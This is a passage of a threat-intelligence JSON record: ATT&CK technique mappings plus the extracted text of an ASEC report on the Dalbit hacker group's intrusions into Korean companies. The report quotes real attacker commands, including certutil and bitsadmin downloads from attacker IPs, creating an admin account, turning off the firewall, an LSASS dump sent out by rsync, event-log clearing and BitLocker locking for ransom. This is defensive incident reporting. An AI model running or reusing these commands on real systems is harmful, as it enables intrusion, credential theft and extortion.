              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "10a8fc2e-31e1-4bcb-a7a6-d6593374b7b2",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Screen Capture",
            "attack_id": "T1113",
            "tactic": "Collection",
            "description": "Detected Screen Capture activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "e565872e-ff6d-419a-98cc-7fcb18ec076a",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Registry Run Keys",
            "attack_id": "T1547.001",
            "tactic": "Persistence",
            "description": "Detected Registry Run Keys activity via NLP pattern matching",
            "confidence_score": 0.623,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "0068cf68-42e9-4fb5-8d2f-94a62c3ca1eb",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Remote Desktop Protocol",
            "attack_id": "T1021.001",
            "tactic": "Lateral Movement",
            "description": "Detected Remote Desktop Protocol activity via NLP pattern matching",
            "confidence_score": 0.623,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "2363783e-2739-4f08-94b6-e5663298de11",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "Detected Phishing activity via NLP pattern matching",
            "confidence_score": 0.621,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "1 / 1 7 By kingkimgim February 13  2023 Dalbit (m00nlight): Chinese Hacker Group s APT Attack Campaign asec.ahnlab.com/en/47455 0. Overview This report is a continuation of the  Attackers Using FRP (Fast Reverse Proxy) to Attack Korean Companies  post that was uploaded on August16  2022 and follows the group s activities since that post. This group has always relied on open-source tools and lacked any distinct characteristics to profile them due to the lack of PDB information.Additionally  the amount of information that could be collected was limited unless the affected Korean companies specifically asked for aninvestigation since the threat actor s C2 (Command Control) server abused the servers of the Korean companies. However  after the post wasuploaded and a portion of the Korean company servers used by the threat actor were blocked  the threat actor began to use a hosting servercalled   .m00nlight.top  as their C2 and download server. Thus  the ASEC team decided to call this group Dalbit (m00nlight.top) after theKorean word for  Moonlight . This group has had more than 50 confirmed attack attempts on Korean companies since 2022. Most of the attacked companies were mid tosmall companies while a portion was major companies. The team has confirmed that 30  of the infected companies were using a certainKorean groupware solution. It is currently difficult to check whether this groupware product has a vulnerability or not  but if a server that isthis exposed has a vulnerability  then there is a chance that companies could be affected gravely through the leakage of confidentialinformation and ransomware behavior. Furthermore  this Dalbit group leaves some infected companies as proxies and download servers tolater use them as means to communicate with the threat actor upon infiltration of another company. Therefore  we strongly recommend performing an internal security check if users suspect that they have been attacked by this Dalbit group.The team asks that users send a report to AhnLab and take preemptive measures to prevent secondary harm and potential damage to othercompanies. 1. Affected Korean Companies (Industry Type) Listed below are the 50 companies that were confirmed to have been affected since 2022. Companies that have not been clearly confirmed wereexcluded from this list. It is possible that more companies could have been affected. Figure 1. Industry types of companies that the Dalbit group tried to attack The following are the descriptions of each industry type. Technology: Companies that handle software or hardwareIndustrial: Manufacturing companies that handle machinery  paint jobs  steel  metals  etc.Chemical: Cosmetic  pharmaceutical  and plastic companiesConstruction: Associations or organizations related to construction or construction companiesAutomobile: Automobile-related manufacturing companiesSemiconductor: Semiconductor-related manufacturing companies 2 / 1 7 Education: Educational companiesWholesale: WholesalersMedia: Printing and media companiesFood: Food companiesShipping: Shipping companiesHospitality: Leisure or tourist accommodation companiesEnergy: Energy companiesShipbuilding: Shipbuilding companiesConsulting: Management consulting companies 2. Flow and Characteristics 2.1. Summary Diagram Figure 2. Summary diagram of Dalbit group s infiltration process The above diagram shows the threat actor s infiltration process into Company B. A brief summary of this flow is in the table below. 1) Initial Access The threat actor targets web servers or SQL servers  which they gain access to by exploiting vulnerabilities. They thenattempt to control the systems with tools such as WebShell.2) Command   Control Various hacking tools are downloaded through WebShell. Hacking tools include various binaries such as privilege escalationtools  proxy tools  and network scanning tools.3) Proxy   Internal Reconnaissance Proxy: The threat actor installs a proxy tool such as FRP (Fast Reverse Proxy) before attempting to connect to 2-1) a hostingserver built by the threat actor or 2-2) another previously infected company s server (Company A) via Remote Desktop (RDP). Internal Reconnaissance: Tools such as network scanning tools and account theft tools are used for internal reconnaissanceand obtaining information.4) Lateral Movement The obtained information is used to move to another connectible server or PC. Afterward  a proxy tool (FRP) is also installedon the PC that has successfully been reached through lateral movement  creating an environment which allows the threatactor to connect via RDP. The required privilege level is then acquired by either adding a specific account or through acredential theft tool like Mimikatz.5) Impact Ultimately  after the threat actor steals all the information they desire  they use BitLocker to lock certain drives and demand aransom. Table 1. Explanation of the infiltration summary diagram The following are major characteristics of the Dalbit group. 2.2. Characteristics of Dalbit 3 / 1 7 List Description Threat Actor s C2 ServersDownload and C2 (Command Control) servers: Korean company or hosting serversOver half of these servers are exploited Korean company servers .m00nlight.top or IP format addresses are often used for the hosting servers Attempts Control Through RDPUsually attempts to access RDP after infectionEither a proxy tool or Gotohttp is used for RDP connection Proxy Tools Major proxy tools used include FRP  LCX (Htran) NPS  ReGeorg   etc. Add User AccountA net command is used to add an accountAccount credentials (ID:  main  / PW:  ff0.123456 ) Open-source Tool Mostly uses open-source tools that are publicly availableA lot of tools are written in Chinese Evasion VMProtect is used to prevent hacking tools from being detectedSecurity event logs are deleted Extorted InformationUser account credentialsEmail informationScreen leakInstalled program information Table 2. Characteristics of Dalbit 3. Tools Used and Infiltration Process 3.1. Tools and Malware Used WebShellDownloader Privilege EscalationProxyInternal Reconnaissance Godzilla ASPXSpy AntSword China Chopper Certutil (Windows CMD) Bitsadmin (Windows CMD)BadPotato JuicyPotato SweetPotato RottenPotato EFSPotato CVE-2018-8639 CVE-2019-1458 FRP LCX NPS ReGeorg FScan NbtScan TCPScan Goon Nltest (Windows CMD) Lateral MovementInformation Leak and CollectionBackdoorFile EncryptionEvasion RDP PsExec RemCom Winexec Wevtutil (Windows CMD) WMI (Windows CMD) ProcDump DumpertEML Extractor (created) MimikatzRsync CobaltStrike MetaSploit BlueShell Ladon BitLocker (Windows CMD)Security log deletion (Windows CMD) Firewall OFF (Windows CMD) Attempts to delete AV products VMProtect Packing Table 3. Malware and hacking tools used by Dalbit Only one tool for leaking emails seems to have been made by the group themselves. The rest are normal Windows programs or tools that caneasily be found online. 3.2. Infiltration Process 3.2.1. Initial Infiltration It is assumed that their attack targets are usually servers with a specific Korean groupware installed on them  email servers (Exchange Server) and SQL servers. The threat actor exploited either file upload vulnerabilities or WebLogic vulnerabilities such as CVE-2017-10271 to uploadtheir WebShell. A portion appeared to have used a SQL server command prompt (xp_cmdshell). The most frequently used WebShells are Godzilla  ASPXSpy  AntSword  and China Chopper in that order. Aside from these  several otherWebShells were also found. The installation paths of the WebShells are as follows. 4 / 1 7   Job recruitment (File upload vulnerability)D:\\WEB\\        recruit\\css\\1.ashxD:\\WEB\\        recruit\\css\\4.ashxD:\\WEB\\        recruit\\common\\conf.aspx...  File upload vulnerabilityD:\\UploadData\\           \\    _File\\Data\\Award\\1.ashxD:\\UploadData\\           \\    _File\\Data\\Award\\2.aspxD:\\UploadData\\           \\    _File\\Data\\Award\\3.aspxD:\\  WebService\\        \\     Editor\\sample\\photo_uploader\\File\\conf.aspxD:\\  WebService\\        _ThesisSubmission\\Include\\file.aspx...  Certain groupwareD:\\Web\\(Groupware)\\cop\\1.ashxD:\\Web\\(Groupware)\\app\\4.ashxD:\\Web\\(Groupware)\\bbs\\4.asmxD:\\Web\\(Groupware)\\erp\\tunnel.aspx (ReGeorg)D:\\inetpub\\(Groupware)\\image\\2.asmxD:\\inetpub\\(Groupware)\\image\\2.aspxC:\\(Groupware)\\Web\\(Groupware)\\cop\\conf.aspxC:\\(Groupware)\\Web\\(Groupware)\\cop\\1.ashxC:\\(Groupware)\\Web\\(Groupware)\\cop\\1.asmxC:\\(Groupware)\\Web\\(Groupware)\\cop\\1.aspx   Email server (Exchange Server)D:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\aa.aspxD:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\11.aspxC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NETFiles\\root\\91080f08\\2694eff0\\app_web_defaultwsdlhelpgenerator.aspx.cdcab7d2.sjx_41yb.dllC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\root\\91080f08\\2694eff0\\app_web_ldaj2kwn.dll   WeblogicD:\\   \\wls1035\\domains\\            \\servers\\       \\tmp\\            \\uddiexplorer\\gcx62x\\war\\modifyregistryhelp.jspD:\\   \\wls1035\\domains\\            \\servers\\       \\tmp\\            \\wls-wsat\\zfa3iv\\war\\eee.jspD:\\   \\wls1035\\domains\\            \\servers\\       \\tmp\\            \\wls-wsat\\zfa3iv\\war\\error.jspD:\\Oracle\\          \\user_projects\\domains\\             \\servers\\WLS_FORMS\\tmp\\            \\wls-wsat\\tcsxmg\\war\\123.jspD:\\Oracle\\          \\user_projects\\domains\\             \\servers\\WLS_FORMS\\tmp\\            \\wls-wsat\\tcsxmg\\war\\test.jsp D:\\Oracle\\          \\user_projects\\domains\\             \\servers\\WLS_FORMS\\tmp\\            \\wls-wsat\\tcsxmg\\war\\aaa.jsp   TomcatC:\\(Tomcat)\\webapps\\dd\\sb.jspC:\\(Tomcat)\\webapps\\ddd\\index.jspC:\\(Tomcat)\\webapps\\docs\\update.jspC:\\(Tomcat)\\webapps\\tmp\\shell.jsp Table 4. Paths where WebShells were uploaded 3.2.2. Download The threat actor downloads other hacking tools through default Windows programs. Since WebShells are normally used in infiltration  parentprocesses  excluding command processes like cmd  are run by web server processes such as w3wp.exe  java.exe  sqlserver.exe  andtomcat .exe. The downloaded files include privilege escalation tools  proxy tools  and network scanning tools  all of which are required by thethreat actor. The download command is as follows. (Additionally  the full addresses of the Korean companies that have been exploited will not be disclosed.) 1) Certutil   certutil -urlcache -split -f hxxp://www.ive   .co[.]kr/uploadfile/ufaceimage/1/update.zip c:\\programdata\\update.exe (frpc)   certutil -urlcache -split -f hxxp://121.167.   [.]   /temp/8.txt c:\\programdata\\8.ini (frpc.ini)   certutil -urlcache -split -f hxxp://103.118.42[.]208:8080/frpc.exe frpc.exe   Table 5. Certutil download log 2) Bitsadmin   bitsadmin /transfer mydownloadjob /download /priority normal  hxxp://91.217.139[.]117:8080/calc32.exe  c:\\windows\\debug\\winh32.exe  (frpc)   bitsadmin /transfer mydownloadjob /download /priority normal  hxxp://91.217.139[.]117:8001/log.ini  c:\\windows\\debug\\log.ini  (frpc.ini)   Table 6. Bitsadmin download log 5 / 1 7 The hacking tools and malware downloaded by the threat actor were usually found in the following paths.  ALLUSERSPROFILE  SystemDrive \\temp  SystemDrive \\perflogs  SystemDrive \\nia  SystemDrive \\.tmp SystemRoot   SystemRoot \\debug  SystemRoot \\temp Table 7. Major directories used by the Dalbit group Therefore  the files in these paths should be checked if users suspect that they have been infiltrated. 3.2.3. Privilege Escalation and Account Addition The threat actor mainly used Potato (BadPotato  JuicyPotato  SweetPotato  RottenPotato  EFSPotato) and PoC (CVE-2018-8639  CVE-2019-1458)  which has been published on GitHub  for privilege escalation. After privilege escalation  they characteristically add the followingaccount. The below sp.exe is the SweetPotato tool.   sp.exe  whaomi  (Privilege check)   sp.exe  netsh advfirewall set allprofiles state off  (Firewall OFF)   sp.exe  net user main ff0.123456 /add   net localgroup administrators main /add  (Add account) Table 8. SweetPotato usage log The point of focus here is the name of the account added by the threat actor. Threat actor accounts with the name  main  have been found inother infiltrated company servers. Aside from adding accounts  the threat actor would also use stolen admin accounts.   wmic /node:127.0.0.1 /user:storadmin /password:r     1234 @ $ process call create  cmd.exe /c c:\\temp\\s.bat  Table 9. Admin account execution log 3.2.4. Proxy Settings After infiltrating a server  the threat actor initiates access via proxy to use RDP communications. FRP and LCX were the mainly used proxytools  and there have been cases where ReGeorg  NPS  or RSOCKS was found in some companies. Additionally  multiple proxy tools includingFRP and LCX were found in one area of a certain company that was infiltrated. Multiple FRP configuration files (.ini) would also be discoveredin cases where internal propagation had occurred. We believe that the threat actor installs additional FRPs and uses multiple configurationfiles when an accessible PC has a lot to gain. Furthermore  the LCX used by this group has the same features as the open-source LCX  but itsversion is not the same as the one uploaded to GitHub  meaning that a binary that was arbitrarily compiled by a Chinese person was used. Proxy tools like FRP and LCX differ in terms of forwarding methods and supported protocols. However  since their differences  actual infectioncases  recreation  and network packets have all been covered in the TI report   Analysis Report on Attack Cases Exploiting Various RemoteControl Tools   they will not be reiterated in this post. 1) FRP(FAST REVERSE PROXY) FRP configuration files (.ini) were found in all servers and PC devices infiltrated by this group. The following is an actual case of an infiltratedcompany. Figure 3. FRPC configuration file (m00nlight.top) found in an infiltrated company In particular  the Dalbit group usually used the Socks5 protocol to communicate. The Socks5 protocol is a layer 5 protocol in the 7 OSI layers. Itcan handle various requests such as HTTP  FTP  and RDP since it is between layer 4 and 7. Therefore  if the threat actor uses a proxyconnection tool that can handle Socks5  such as Proxifier  remote control through RDP becomes possible. If a connection can be established toan internal PC  lateral movement can also be achieved. Thus  if the configuration file is set as a Socks5 protocol  the threat actor will have morefreedom as additional modifications will no longer be required to handle various requests. 6 / 1 7 Figure 4. Example of Socks5 usage The following are FRP filenames and commands used by the threat actor. The list is in a descending order from most to least used. FRP filenames update.exe debug.exe main.exe info.exe Agent.exe frpc.exe test.exe zabbix.exe winh32.exe cmd.exe Table 10. FRP filenames FRP commands   update.exe -c frpc.ini   update.exe -c 8080.ini   update.exe -c 8.ini   info.zip -c frpc__8083.ini   debug.exe -c debug.ini   debug.exe -c debug.log   debug.exe -c debug.txt   frpc.exe -c frpc__2381.ini   cmd.exe /c c:\\temp\\    \\temp\\frpc.ini   Table 11. FRP execution log In certain companies  the FRP was registered to the task scheduler (schtasks) under the name  debug  to maintain its persistence. As shown inTable 12  the team confirmed the execution of a registered scheduler. 7 / 1 7   schtasks /tn debug /run Table 12. Task scheduler execution log 2) LCX(HTRAN) Dalbit used an LCX (Htran) binary compiled by a certain Chinese person. This has the same features as the existing binary  but it also includesthe nickname of the binary creator. Figure 5. Screen that is displayed upon executing the LCX used by the Dalbit group (By \u6298\u7fbd\u9e3f\u9e44 ) We can confirm through this that the nickname of the person who had created the binary is   \u6298\u7fbd\u9e3f\u9e44   (QQ:56345566). It is highly unlikelythat this developer is the threat actor in question  however  since this binary cannot be downloaded through a simple search online  it isassumed that the threat actor has a connection to China. The installed filenames and executables are as follows: LCX filenames lcx3.exe lcx.exe update.exe Table 13. LCX filenames LCX commands   update.exe -slave 1.246.   .    110 127.0.0.1 3389   lcx3.exe -slave 222.239.   .    53 127.0.0.1 3389   Table 14. LCX command log The above LCX C2 is a Korean company server and has been concealed. 3.2.5. Internal Reconnaissance Fscan and NBTScan have been commonly used for network scans  but the usage of TCP Scan and Goon have also been confirmed for somecases. Goon is a network scanning tool made with Golang that not only allows basic port scanning  but scanning for Tomcat  MSSQL  and MYSQLaccounts as well. We can see that this tool was also made in Chinese. 8 / 1 7 Figure 6. Screen that is displayed upon executing Goon 3.2.6. Information Extortion LSASS Dump information and EML files of certain accounts are usually the information that is stolen. It has been confirmed that installedprograms are checked through a WMIC command or a screenshot of the affected PC is sent to the threat actor s server at regular intervalsaccording to the companies. 1) Credential Extraction (LSASS Dump) According to the target  the threat actor would choose to not install Mimikatz and attempt to extract credentials instead. This is a method thatdumps the Lsass.exe process. Credential information can be obtained from a PC with tools like Mimikatz or Pypykatz since they can be foundwithin the dump file. Additionally  a detailed explanation of Mimikatz can be found in the TI report   Analysis Report on Internal WebSpreading Methods Using Mimikatz . The following method is how the threat actor stole credentials without Mimikatz. 1-1) Dumpert Open-source Dumpert is an API hooking evasion tool that operates according to the target OS system and uses the MiniDumpWriteDump()API to dump the lsass.exe process. The threat actor modified the code to change the path of the dump file and remove features like log output. Figure 7. Left (open-source Dumpert) vs. right (Dumper used by the Dalbit group) 9 / 1 7 The above figure shows that the two versions are the same aside from the different paths and the removal of the output string. The following table displays all of the   SystemRoot \\temp  dump file paths that have currently been found.  SystemRoot \\temp\\duhgghmpert.dmp  SystemRoot \\temp\\dumpert.dmp  SystemRoot \\temp\\tarko.dmp  SystemRoot \\temp\\lsa.txt   Table 15. Lsass dump file paths 1-2 ) Procdump Procdump is a normal utility program provided by Microsoft and offers the process dump feature. The threat actor performed a dump like theone in Figure 8 with this tool. Figure 8. Output upon executing Procdump Afterward  the threat actor used a tool called Rsync (Remote Sync) to send the dump file to their own server. The following is an actual exampleof information theft attempted by the threat actor.   svchost.exe -accepteula -ma lsass.exe web_log.dmp   rsync -avz  port 443 web_log.zip test@205.185.122[.]95::share/web_log.zip Table 16. Procdump execution and rsync usage log 2) Email Extraction Figure 9. Screen displayed upon executing email extraction tool This sample is an email extraction tool developed with Golang and presumably the only known tool developed by the threat actor themselves.This tool offers the ability to target a company s Exchange email server and extract a specific account s email with EWS (Exchange WebService) as an EML file. Arguments include the Exchange server address  account name  NTLM password hash of said account  date and time etc. When launched  the tool extracts every email from the mailboxes of the target account according to the time received as an argument andsaves them as an EML file. For reference  the PDB information of this binary is  fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff and is meaningless. 1 0 / 1 7 Figure 10. PDF information of the email extraction tool 3) Screen Leak The threat actor sent screenshots from certain PCs to their own server. While a binary that takes screenshots of the current screen has not beenfound as of yet  the threat actor s server where the infected PC s screenshots were being sent has been discovered. Screenshots from a certaincompany s infiltrated PC sent pictures every 5-10 seconds. Outgoing server of threat actor s screenshots: hxxp://91.217.139[.]117:8080/1.bat 1 1 / 1 7 Figure 11. Actual PC screenshot sent from a certain affected company Only images were sent. The PC could not be controlled remotely and no audio was outputted either. Also  the threat actor s server (91.217.139[.]117) where the screenshots were being sent was also being used as a download server for anothercompany.  certutil -urlcache -split -f hxxp://91.217.139[.]117:8080/calc32.exe  certutil -split -urlcache -f hxxp://91.217.139[.]117:8443/log.ini c:\\temp  bitsadmin /transfer mydownloadjob /download/priority normal  hxxp://91.217.139[.]117:8080/calc32.exe   c:\\windows\\debug\\winh32.exe  (frpc)  bitsadmin /transfer mydownloadjob /download /priority normal  hxxp://91.217.139[.]117:8001/log.ini  c:\\windows\\debug\\log.ini  (frpc.ini) Table 17. A different log from the threat actor s server (91.217.139[.]117) 4) Lookup Installed Programs and Login Information The threat actor used a WMIC command to check installed programs.   wmic product get name version Table 18. How the threat actor looked up installed programs 1 2 / 1 7 Figure 12. List of installed programs and command example (WMIC) Furthermore  the domain account credentials that caused certain event IDs to occur in the event log were collected. The created file is saved inc:\\temp\\EvtLogon.dat. Event IDMeaning 4624 Login successful 4768 Kerberos authentication request 4776 NTLM authentication attempt Table 19. Meanings of the event IDs used by the threat actor   wevtutil qe security /q: Event[System[(EventID 4624 or EventID 4768 or EventID 4776)]]  /f:text /rd:true   c:\\temp\\EvtLogon.dat Table 20. wevtutil command log 3.2.7. File Encryption Details about this matter have been covered in a past blog post. The threat actor used BitLocker  a Windows utility  to encrypt certain drivesand demand ransoms. Currently  more affected companies are still being found. BitLocker commands    C:\\Windows\\System32\\BitLockerWizardElev.exe  F:\\ T   manage-bde -lock -ForceDismount F:   manage-bde -lock -ForceDismount e:    c:\\windows\\system32\\bitlockerwizardelev.exe  e:\\ t    c:\\windows\\system32\\bitlockerwizardelev.exe  f:\\ u Table 21. BitLocker log Figure 13 is the ransom note used by the threat actor. The threat actor used anonymous mailing services such as startmail.com andonionmail.com. Figure 13. Ransom note that was shown in a previous blog post The command assumed to be for downloading the ransom note is as follows.   certutil -urlcache -split -f hxxp://175.24.32[.]228:8888/readme c:\\windows\\temp\\readme Table 22. Log assumed to display the ransom note being downloaded 3.2.8. Evasion 1) VMPROTECT PACKING When the binary was detected after being uploaded  the threat actor packed it with VMProtect to try and avoid detection. 1 3 / 1 7   Privilege escalation tools ALLUSERSPROFILE \\badpotatonet4.exe ALLUSERSPROFILE \\BadPotatoNet4.vmp.exe ALLUSERSPROFILE \\SweetPotato.exe ALLUSERSPROFILE \\SweetPotato.vmp.exe ALLUSERSPROFILE \\jc.vmp.exe SystemDrive \\nia\\juicypotato.vmp1.exe SystemDrive \\nia\\juicypotato.vmp.exe   Proxy toolsE:\\WEB\\     \\data\\frpc.vmp.exe ALLUSERSPROFILE \\lcx.exe ALLUSERSPROFILE \\lcx_VP.exe SystemDrive \\Temp\\lcx.exe SystemDrive \\Temp\\lcx_VP.exe SystemDrive \\Temp\\svchost.exe (FRP) SystemDrive \\Temp\\frpc.vmp.exe  Table 23. File packed with VMP 2) Windows Event Log Deletion Using Wevtutil Removal of security event logs   cmd.exe /c wevtutil cl security Removal of application logs   cmd.exe wevtutil.exe el   cmd.exe wevtutil.exe cl  application  Table 24. Deletion of Windows event logs 3) Firewall OFF sp.exe  netsh advfirewall set allprofiles state off  Table 25. Firewall OFF 4. Conclusion The Dalbit hacking group attempted attacks against vulnerable Korean company servers  and logs are being reported not only from mid-sizedand smaller businesses  but also from some large companies. In particular  30  of the affected companies were found to have been using acertain Korean groupware product. Moreover  this group uses publicly available tools  from the WebShell used in the early stages to theransomware used at the end. Among these tools  there is a proxy tool that is assumed to have been obtained from a Chinese community  a toolwith Chinese documentation  and a Chinese tool not mentioned in this post. It can be assumed that the threat actor has at least a partialconnection with China  considering their frequent usage of Chinese tools. If a server admin suspects that their system has been infected  they are advised to check their IOC along with the aforementioned downloadpaths and account name ( main ) often used by the threat actor. If suspicions are confirmed  then it is advised to immediately report yoursituation to AhnLab in order to minimize additional harm. Furthermore  admins should prevent vulnerability attacks by updating their serversto the newest version for vulnerability patches  and maintenance is especially needed for servers that are open externally but not managed. 5. IOC For reference  the IP addresses of Korean company servers abused by the threat actor will not be disclosed on the ASEC blog. Mitre Attack Execution PersistencePrivilegeEscalationCredentialAccessDiscoveryDefenseEvasion LateralMovement   Command andScriptingInterpreter(T1059)  WindowsManagementInstrumentation(T1047)  SystemService(T1569)   ScheduledTask/Job(T1053)  CreateAccount(T1136)  Server SoftwareComponent(T1505)  AccountManipulation(T1098)   Access TokenManipulation(T1134)  Exploitation forPrivilegeEscalation(T1068)   OSCredentialDumping(T1003)   RemoteSystemDiscovery(T1018)  NetworkServiceDiscovery(T1046)   ImpairDefenses(T1562)  IndicatorRemoval(T1070)   RemoteServices(T1021)  Lateral ToolTransfer(T1570) Table 26. MITRE Attack 1 4 / 1 7 Detection Names WebShell/Script.Generic (2020.12.11.09) WebShell/ASP.ASpy.S1361 (2021.02.02.03) WebShell/ASP.Generic.S1855 (2022.06.22.03) WebShell/ASP.Small.S1378 (2021.02.24.02) WebShell/JSP.Godzilla.S1719(2021.12.03.00) WebShell/JSP.Chopper.SC183868(2022.10.15.01) WebShell/JSP.Generic.S1363 (2021.01.27.03) Backdoor/Script.Backdoor (2015.01.04.00) WebShell/JSP.Generic.S1956 (2022.11.14.00) Trojan/Script.Frpc (2022.12.17.00) JS/Webshell (2011.08.08.03) HackTool/Win.Fscan.C5334550(2023.01.27.00) HackTool/Win.Fscan.C5230904(2022.10.08.00) HackTool/Win.Fscan.R5229026(2022.10.07.03) Trojan/JS.Agent(2022.03.16.02) Unwanted/Win32.TCPScan.R33304(2012.08.17.00) HackTool/Win.Scanner.C5220929(2022.08.09.02) HackTool/Win.SweetPotato.R506105 (2022.08.04.01) Exploit/Win.BadPotato.R508814 (2022.08.04.01) HackTool/Win.JuicyPotato.R509932 (2022.08.09.03) HackTool/Win.JuicyPotato.C2716248 (2022.08.09.00) Exploit/Win.JuicyPotato.C425839(2022.08.04.01) Exploit/Win.SweetPotato.C4093454 (2022.08.04.01) Trojan/Win.Escalation.R524707(2022.10.04.02) Trojan/Win.Generic.R457163(2021.12.09.01) HackTool/Win64.Cve-2019-1458.R345589(2020.07.22.06) Malware/Win64.Generic.C3164061 (2019.04.20.01) Malware/Win64.Generic.C3628819 (2019.12.11.01) Exploit/Win.Agent.C4448815 (2021.05.03.03) Trojan/Win.Generic.C4963786 (2022.02.11.04) Trojan/Win.Exploit.C4997833 (2022.03.08.01) Exploit/Win.Agent.C5224192 (2022.08.17.00) Exploit/Win.Agent.C5224193 (2022.08.17.00) Trojan/Win32.RL_Mimikatz.R290617(2019.09.09.01) Trojan/Win32.Mimikatz.R262842(2019.04.06.00) Trojan/Win.Swrort.R450012(2021.11.14.01) HackTool/Win.Lsassdump.R524859(2022.10.05.00) HackTool/Win.ProxyVenom.C5280699(2022.10.15.01) Unwanted/Win.Frpc.C5222534 (2022.08.13.01) Unwanted/Win.Frpc.C5218508 (2022.08.03.03) Unwanted/Win.Frpc.C5218510 (2022.08.03.03) Unwanted/Win.Frpc.C5218513 (2022.08.03.03) HackTool/Win.Frpc.5222544 (2022.08.13.01) HackTool/Win.Frp.C4959080 (2022.02.08.02) HackTool/Win.Frp.C5224195 (2022.08.17.00) Unwanted/Win.Frpc.C5162558 (2022.07.26.03) Malware/Win.Generic.C5173495 (2022.06.18.00) HackTool/Win.LCX.C5192157 (2022.07.04.02) HackTool/Win.LCX.R432995(2023.01.06.01) HackTool/Win.Rsocx.C5280341(2022.10.15.00) Backdoor/Win.BlueShell.C5272202(2022.10.05.00) Trojan/Win.BlueShell.C5280704(2022.10.15.01) Backdoor/Win.CobaltStrike.R360995(2022.09.20.00) Unwanted/Win.Extractor.C5266516(2022.10.01.00) Trojan/Win.RemCom.R237878(2023.01.07.00) [IOC] MD5 (Excluding normal files) 1 5 / 1 7   WebShell0359a857a22c8e93bc43caea07d07e2385a6e4448f4e5be1aa135861a2c35d354fc81fd5ac488b677a4c0ce5c272ffe3c0452b18695644134a1e38af0e9741726b4c7ea91d5696369dd0a848586f0b2896b23ff19a945fad77dd4dd6d166faaa88bef25e4958d0a198a2cc0d921e4384c908340bf152b96dc0f270eb6d39437f2c3de1cefe5cd2a5315a9c9970277bd7e5b626c4b172065005d04205b026e44627ec6fb6739c4886b3c9e21b6b9041b6612585fa3ada349a02bc97d4c60de78421c7b2e6e0fb603c5fdd33781ac84b8fc44457653b2c69933e04734fe31ff699e31b7d841b1865e11eab056e70416f1a69c7d9025fa3841c4cd69db1353179cffca13226da57b33f95bf3faad1004ee0af002abd289296572d8afadfca809294e981219f6ba673e977c5c1771f86b189f978d05f1ebeb5df334f395d58a7e108e3af60f483774014c43a7617c44d05e7c802dd3d8732d9834c5a558e9d39ed3707191f554ed5d9025bc85ee1bf51f97561a687b0bea0ef97224c7bd2df118b87 (omitted)   Privilege 